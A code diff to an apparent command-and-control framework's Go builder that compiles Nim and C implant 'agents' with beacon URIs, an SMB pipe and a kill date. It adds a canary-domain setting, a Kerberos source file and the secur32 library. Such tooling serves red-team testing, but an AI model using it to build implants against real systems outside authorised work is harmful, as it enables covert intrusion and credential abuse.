@@ -314,6 +314,9 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 			args = append(args, fmt.Sprintf("-d:DNSServer=%s", cfg.DNSServer))
 		}
 	}
+	if cfg.CanaryDomain != "" {
+		args = append(args, fmt.Sprintf("-d:CanaryDomain=%s", cfg.CanaryDomain))
+	}
 	args = append(args, entryFile)
 
 	cmd := exec.Command(nim, args...)
@@ -556,6 +559,7 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		filepath.Join(agentDir, "crypto.c"),
 		filepath.Join(agentDir, "b64.c"),
 		filepath.Join(agentDir, "api_resolve.c"),
+		filepath.Join(agentDir, "kerberos.c"),
 	}
 
 	args := []string{
@@ -569,10 +573,11 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		fmt.Sprintf("-DAGENT_KILL_DATE=%q", cfg.KillDate),
 		fmt.Sprintf("-DAGENT_SMB_PIPE=%q", cfg.SMBPipe),
 		fmt.Sprintf("-DAGENT_BEACON_URIS=%q", cfg.BeaconURIs),
+		fmt.Sprintf("-DAGENT_CANARY_DOMAIN=%q", cfg.CanaryDomain),
 		"-o", outPath,
 	}
 	args = append(args, sources...)
-	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32")
+	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32")
 
 	cmd := exec.Command(cc, args...)
 	cmd.Dir = root
